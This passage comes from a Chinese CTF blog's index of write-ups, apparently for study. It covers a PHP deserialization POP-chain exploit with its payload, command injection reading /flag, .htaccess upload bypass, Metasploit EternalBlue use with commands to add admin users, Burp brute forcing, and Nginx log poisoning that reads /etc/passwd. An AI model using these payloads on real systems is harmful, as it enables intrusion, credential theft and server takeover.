class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SH::<span class="variable">$SHCTF</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;o-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;其实。。。。,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHCTF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (SH::<span class="variable">$Web</span>) &#123;</span><br><span class="line"></span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;isyou)(<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;小丑竟是我自己呜呜呜~&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;小丑别看了!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;小丑离我远点！！！&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>分析代码，构造pop链：</p><p>T-&gt;<strong>destruct() ——&gt;  F-&gt;</strong>toString() ——&gt; C-&gt;flag() ——&gt; SHCTF-&gt;__invoke()</p></blockquote><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SH</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    public static <span class="variable">$Web</span> = false;</span><br><span class="line">    public static <span class="variable">$SHCTF</span> = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    public <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    public <span class="variable">$n</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    public <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHCTF</span> </span>&#123;</span><br><span class="line">    public <span class="variable">$isyou</span>;</span><br><span class="line">    public <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new SHCTF();</span><br><span class="line"><span class="variable">$a</span>-&gt;isyou = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;flag = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = new C();</span><br><span class="line"><span class="variable">$b</span>-&gt;p = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = new F();</span><br><span class="line"><span class="variable">$c</span>-&gt;o = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span> = new T();</span><br><span class="line"><span class="variable">$d</span>-&gt;n = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">echo serialize(<span class="variable">$d</span>);</span><br><span class="line">?&gt;</span><br><span class="line"><span class="regexp">//</span>O:<span class="number">1</span>:<span class="string">&quot;T&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;n&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;o&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;SHCTF&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;isyou&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;&#125;&#125;&#125;</span><br><span class="line">//base64:TzoxOiJUIjoxOntzOjE6Im4iO086MToiRiI6MTp7czoxOiJvIjtPOjE6IkMiOjE6e3M6MToicCI7Tzo1OiJTSENURiI6Mjp7czo1OiJpc3lvdSI7czo2OiJzeXN0ZW0iO3M6NDoiZmxhZyI7czo3OiJjYXQgL2YqIjt9fX19</span><br></pre></td></tr></table></figure><blockquote><p>传入base64编码后的内容，得到flag</p><p>SHCTF{d4b773f4-1dd4-4321-903f-aa718e1ea99d}</p></blockquote><h4 id="Week1-蛐蛐-蛐蛐"><a href="#Week1-蛐蛐-蛐蛐" class="headerlink" title="[Week1] 蛐蛐?蛐蛐!"></a>[Week1] 蛐蛐?蛐蛐!</h4><blockquote><p>考点：弱比较，命令执行</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013174644889.png" alt="image-20241013174644889"></p><blockquote><p>查看源码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013174718789.png" alt="image-20241013174718789"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013174803030.png" alt="image-20241013174803030"></p><blockquote><p>第一个弱比较 ，直接传 ?ququ=114514a。</p><p>第二个直接使用命令执行:</p><p>ququ=ququk1;system(“cat /flag”);</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013175007576.png" alt="image-20241013175007576"></p><blockquote><p>得到flag</p><p>SHCTF{a317f4fb-8cfa-43d9-9bce-85ab6f8633c6}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传绕过</title>
      <link href="/posts/c2e822dd.html"/>
      <url>/posts/c2e822dd.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="1-文件头检查绕过"><a href="#1-文件头检查绕过" class="headerlink" title="1.文件头检查绕过"></a>1.文件头检查绕过</h2><p>这类题进行文件头检查一般是检查concent-type的内容，需要修改成允许的文件类型就行,如 image/jpg<br>然后一句话木马前还要加上对应文件类型的前缀，如GIF89a<br>做这类题时可以先找到允许的文件类型，然后放进010editor看看标识符，然后修改</p><h2 id="MIME及绕过"><a href="#MIME及绕过" class="headerlink" title="MIME及绕过"></a>MIME及绕过</h2><p>1. 什么是MIME：<br>   MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p><p>2. 常见的MIME类型:<br>   text/plain （纯文本）<br>   text/html （HTML文档）<br>   text/javascript （js代码）<br>   application/xhtml+xml （XHTML文档）<br>   image/gif （GIF图像）<br>   image/jpeg （JPEG图像）<br>   image/png （PNG图像）<br>   video/mpeg （MPEG动画）<br>   application/octet-stream （二进制数据）<br>   application/pdf （PDF文档）</p><p>3. 检测方式：<br>   在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。</p><p>4. MIME绕过的原理：<br>   部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。</p><h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><blockquote><p>知识：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>介绍：hatccess文件，.htaccess是Apache的又一特色。<br>● 一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件），<br>● 提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>● 作为用户，所能使用的命令受到限制。<br>● 简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p></blockquote><p>常用内容：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> AddType application/<span class="variable language_">x</span>-httpd-php .png  <span class="comment">//.png文件当作php文件解析</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> <span class="comment">//只要文件名中包含pass777，就会被Apache解析为php文件。</span></span><br><span class="line">   &lt;FilesMatch <span class="string">&quot;pass777&quot;</span>&gt;</span><br><span class="line">   SetHandler application/<span class="variable language_">x</span>-httpd-php</span><br><span class="line">   &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali中metasploit使用</title>
      <link href="/posts/9375d9ee.html"/>
      <url>/posts/9375d9ee.html</url>
      
        <content type="html"><![CDATA[<h1 id="kali中metasploit使用"><a href="#kali中metasploit使用" class="headerlink" title="kali中metasploit使用"></a>kali中metasploit使用</h1><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1e872c4cd10f79a63d862c2e8076cf90.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/62577fd08549538e7954aa69fc08e8c5.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4a4f354e8700b71e6a64bbacf835665f.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/03c79ac5eb64fafc8039b2073510fe97.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/22fb34311121e723024aef8d4770b853.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0bd2074ec17321ee3ff23e228b564694.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8fd0c7c69790abc63539f79b0f4fa84c.jpg" alt=""></p><blockquote><p>shell命令会开启目标机的cmd控制台，打开了这个就相当于可以执行任何命令。</p></blockquote><p><strong>打进去后，进行远程桌面连接的注意事项：</strong></p><p><strong>1.创建用户：net user username password /add</strong></p><p><strong>2.赋予用户管理员权限：net localgroup group_name UserLoginName /add</strong></p><p><strong>3.没有赋予管理员权限远程桌面连接是会失败的。</strong></p><p><strong>4.win7不能同时登陆一个账户，比如目标机登录了一个账户，攻击者在进行远程登录桌面时会把目标机顶下去。</strong></p><p><strong>一些注意事项：</strong></p><p><strong>1.run后报错Host does NOT appear vulnerable.：说明靶机打了补丁的，修复了永恒之蓝漏洞（补丁：KB4474419），删除就可以了。</strong></p><p><strong>2.run getgui -e报错：换成 run post/windows/manage/enable_rdp即可</strong></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8b320bd4fb77b7538bc5d6fab277b5fc.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.9.26</title>
      <link href="/posts/ea2003c8.html"/>
      <url>/posts/ea2003c8.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>ps:源自CTFhub</p></blockquote><h2 id="基础认证："><a href="#基础认证：" class="headerlink" title="基础认证："></a>基础认证：</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a href="https://zh.wikipedia.org/wiki/HTTP基本认证">https://zh.wikipedia.org/wiki/HTTP基本认证</a></p><blockquote><p>考点：http基础认证，脚本编写，爆破</p><p>访问 /flag 发现需要登录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d3CuuayvCVYewwJQZ9CKq7.png" alt="img"></p><p>挂上 BurpSuite 的代理，随便输个账号密码（比如: 账号aaa 密码 bbb）访问，查看 HTTP 响应报文：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/mHCcfHrFbZ1EsLnRF4S6oD.png" alt="img"></p><p>得到提示 <code>do u konw admin ?</code>，于是猜测账号是 <code>admin</code> , 那么接下来就只需要爆破密码了</p><p>注意看到 HTTP 请求头部的 Authorization 字段:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic <span class="attribute">YWFhOmJiYg</span>==</span><br></pre></td></tr></table></figure><p>Basic 表示是「基础认证」, 后面的 <code>YWFhOmJiYg==</code> 用 <code>base64</code> 解码后是 <code>aaa:bbb</code> , 也就是我们之前输入的 <code>账号:密码</code></p><p>使用 BurpSuite 进行基础认证爆破</p><ol><li>将报文发送到 <code>Intruder</code>, 将 <code>Basic</code> 后面 <code>base64</code> 部分添加为 <code>payload position</code></li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/iWZSTz79F5B6xjgc1fZjaF.png" alt="img"></p><ol><li><p>在 <code>Payloads</code> 选项卡下，选择 <code>Payload Type</code> 为 <code>SimpleList</code>, 然后在 <code>Payload Options</code> 中点击 <code>load</code> 加载密码字典</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/v7ZFtURkVZRWNNfSx7ANgv.png" alt=""></p></li></ol><p>Payload Processing<code>-&gt;</code>Add<code>-&gt;</code>Add Prefix<code>（添加前缀）-&gt; 输入</code>admin:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/rK5WUQBdKtDMC3Lb8em6Z9.png" alt="img"></p><p>Payload Processing<code>-&gt;</code>Add<code>-&gt;</code>Encode`（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/jZocPqp6oAHwpyq9Fq3tgq.png" alt="img"></p><p>Payload Encode<code>取消勾选的</code>URL-encode<code>, 不然你会看到 base64 之后的</code>=<code>会被转成</code>%3d` ，你就算爆破到天荒地老也不会出来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7CYo3PHXcLpw8v3ivPFapV.png" alt="img"></p><p>Start Attack<code>，然后按</code>Status` 排序，看到状态码出现 200 的，即爆破成功</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/q8WhTrUghWgAw6sTZai7bj.png" alt="img"></p><p>查看 <code>Response</code> 得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6xbDwpZGbWbiysF2r1xcYU.png" alt="img"></p><h1 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h1><p>考点：网站源码下载</p><p>对常见的备份文件进行扫描，发现存在<code>www.zip</code>，下载该文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926211910629.png" alt="image-20240926211910629"></p><p>打开flag文件看看。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926211942697.png" alt="image-20240926211942697"></p><p>仔细看看文件名，在网站上访问该txt即可获得flag</p><p><img src="upload/image-20240926211847161.png" alt="image-20240926211847161"></p><h2 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h2><blockquote><p>考点：bak文件泄露</p><p>法一：直接.bak下载</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926212955057.png" alt="image-20240926212955057"></p><blockquote><p>法二:curl challenge-ce94238df43bef85.sandbox.ctfhub.com:10800/index.php.bak</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926213209539.png" alt="image-20240926213209539"></p><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><blockquote><p>考点：vim缓存</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926213521841.png" alt="image-20240926213521841"></p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><blockquote><p>考点：.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926214309765.png" alt="image-20240926214309765"></p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><blockquote><p>考点：stash</p><p>直接进行 git-dumper</p><p>然后git log 查看日志</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926221349584.png" alt="image-20240926221349584"></p><p>查看第二个日志，发现进行了改动。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926221411893.png" alt="image-20240926221411893"></p><p>直接进行 git stash pop 从 git 栈中弹出来一个文件，这个文件的内容就是 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926221543642.png" alt="image-20240926221543642"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>账户密码登录爆破实例</title>
      <link href="/posts/2efbb28.html"/>
      <url>/posts/2efbb28.html</url>
      
        <content type="html"><![CDATA[<h2 id="基础认证："><a href="#基础认证：" class="headerlink" title="基础认证："></a>基础认证：</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。</p><blockquote><p>考点：http基础认证，脚本编写，爆破</p><p>访问 /flag 发现需要登录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d3CuuayvCVYewwJQZ9CKq7.png" alt="img"></p><p>挂上 BurpSuite 的代理，随便输个账号密码（比如: 账号aaa 密码 bbb）访问，查看 HTTP 响应报文：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/mHCcfHrFbZ1EsLnRF4S6oD.png" alt="img"></p><p>得到提示 <code>do u konw admin ?</code>，于是猜测账号是 <code>admin</code> , 那么接下来就只需要爆破密码了</p><p>注意看到 HTTP 请求头部的 Authorization 字段:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic <span class="attribute">YWFhOmJiYg</span>==</span><br></pre></td></tr></table></figure><p>Basic 表示是「基础认证」, 后面的 <code>YWFhOmJiYg==</code> 用 <code>base64</code> 解码后是 <code>aaa:bbb</code> , 也就是我们之前输入的 <code>账号:密码</code></p><p>使用 BurpSuite 进行基础认证爆破</p><ol><li>将报文发送到 <code>Intruder</code>, 将 <code>Basic</code> 后面 <code>base64</code> 部分添加为 <code>payload position</code></li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/iWZSTz79F5B6xjgc1fZjaF.png" alt="img"></p><ol><li><p>在 <code>Payloads</code> 选项卡下，选择 <code>Payload Type</code> 为 <code>SimpleList</code>, 然后在 <code>Payload Options</code> 中点击 <code>load</code> 加载密码字典</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/v7ZFtURkVZRWNNfSx7ANgv.png" alt=""></p></li></ol><p>Payload Processing<code>-&gt;</code>Add<code>-&gt;</code>Add Prefix<code>（添加前缀）-&gt; 输入</code>admin:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/rK5WUQBdKtDMC3Lb8em6Z9.png" alt="img"></p><p>Payload Processing<code>-&gt;</code>Add<code>-&gt;</code>Encode`（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/jZocPqp6oAHwpyq9Fq3tgq.png" alt="img"></p><p>Payload Encode<code>取消勾选的</code>URL-encode<code>, 不然你会看到 base64 之后的</code>=<code>会被转成</code>%3d` ，你就算爆破到天荒地老也不会出来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7CYo3PHXcLpw8v3ivPFapV.png" alt="img"></p><p>Start Attack<code>，然后按</code>Status` 排序，看到状态码出现 200 的，即爆破成功</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/q8WhTrUghWgAw6sTZai7bj.png" alt="img"></p><p>查看 <code>Response</code> 得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6xbDwpZGbWbiysF2r1xcYU.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.9.21</title>
      <link href="/posts/7444966b.html"/>
      <url>/posts/7444966b.html</url>
      
        <content type="html"><![CDATA[<h2 id="NISACTF-2022-流量包里有个熊"><a href="#NISACTF-2022-流量包里有个熊" class="headerlink" title="[NISACTF 2022]流量包里有个熊"></a>[NISACTF 2022]流量包里有个熊</h2><p>考点：图片隐写，rot13密码，文件分离，流量包分析</p><p>来源：NSSCTF</p><p>下载附件，是个没有后缀名的文件，放进010查看，是一个流量包。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921093255929.png" alt="image-20240921093255929"></p><p>放进wireshark里，查看tcp流，发现有图片。下载下来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921093434032.png" alt="image-20240921093434032"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921093551843.png" alt="image-20240921093551843"></p><p>将文件放进010查看，发现隐含了一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094208887.png" alt="image-20240921094208887"></p><p>直接改后缀名为zip，然后解压出来得到一个文件夹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094307907.png" alt="image-20240921094307907"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094331322.png" alt="image-20240921094331322"></p><p>文件有两个flag文件，先看第一个，是个base64编码，解码发现不是flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094455821.png" alt="image-20240921094455821"></p><p>再看第二个文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094550937.png" alt="image-20240921094550937"></p><p>这一串字符串刚开始看蒙了，然后看了一下别人的wp，才知道可能是16进制的位移文件。</p><p>SS Q8，联想到jpg文件的FF D8，S-&gt;F,刚好移了13位，用凯撒可以，也可以用rot13密码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921095015123.png" alt="image-20240921095015123"></p><p>然后直接用010，新建16进制文件-&gt;粘贴自16进制文本，然后把解码出来的粘贴进去。得到一张jpg图片。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921095234864.png" alt="image-20240921095234864"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921095305684.png" alt="image-20240921095305684"></p><p>根据标签提示，盲水印，直接放进工具查看，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921095405306.png" alt="image-20240921095405306"></p><p>NSSCTF{S0_clev2l_You}，完事儿~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx日志注入</title>
      <link href="/posts/9fe16725.html"/>
      <url>/posts/9fe16725.html</url>
      
        <content type="html"><![CDATA[<p>Nginx日志注入：</p><p>日志包含漏洞的成因还是服务器没有进行严格的过滤 ，导致用户可以进行任意文件读取，</p><p>但是前提是服务器需要开启了记录日志的功能才可以利用这个漏洞。</p><p>对于Apache，日志存放路径：/var/log/apache/access.log</p><p>对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</p><p>中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell。</p><p>Nginx中的日志分两种，一种是error.log，一种是access.log。error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期间的处理流程相关的信息；access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。</p><p><strong>一、 基础知识</strong></p><ul><li>/etc/nginx/nginx.conf：该文件是Nginx的配置的文件，该文件保存着能够影响服务器运行的配置信息。有时会泄露敏感信息。该文件支持php解析。</li><li>/var/log/nginx/access.log：该文件是Nginx的访问日志文件，Nginx会把每个用户访问信息记录到指定的日志文件里。该文件支持php解析。</li></ul><p>我们尝试读取它的日志文件：</p><p>?url=/var/log/nginx/access.log</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/17d62459f203a388712ca27670837c06.png" alt="img"></p><p>?url=/var/log/nginx/error.log</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9c96b8f8bd67cddea4b17e73b54196e1.png" alt="img"></p><p>尝试读取Linux系统下的用户信息：</p><p>?url=/etc/passwd</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/555ce9ac6884be27758722316bc99f66.png" alt="img"></p><p>从上面的日志信息可以看出是User-Agent的内容，这里我们在User-Agent里插入一句话木马</p><p>由于访问URL时，服务器会对其进行编码，所以我们通过使用burpsuite抓包来进行来注入</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ce977cb9cce6cc662a5e914c8e9aa028.png" alt="img"></p><p>写入一句话木马之后，使用蚁剑尝试连接</p><p>连接url即为日志的地址：<a href="http://ec78819f-174d-4e26-82be-7cce55c08b05.challenge.ctf.show/?url=/var/log/nginx/access.log">http://ec78819f-174d-4e26-82be-7cce55c08b05.challenge.ctf.show/?url=/var/log/nginx/access.log</a></p><p>连接成功</p><p>进入后台，找到flag</p><p>ctfshow{8df69fe0-d37b-4231-a482-c3d93c89f43c}</p><ol><li>Linux常见日志的路径和功能总结</li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/wps2.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.9.11</title>
      <link href="/posts/5f69c5a8.html"/>
      <url>/posts/5f69c5a8.html</url>
      
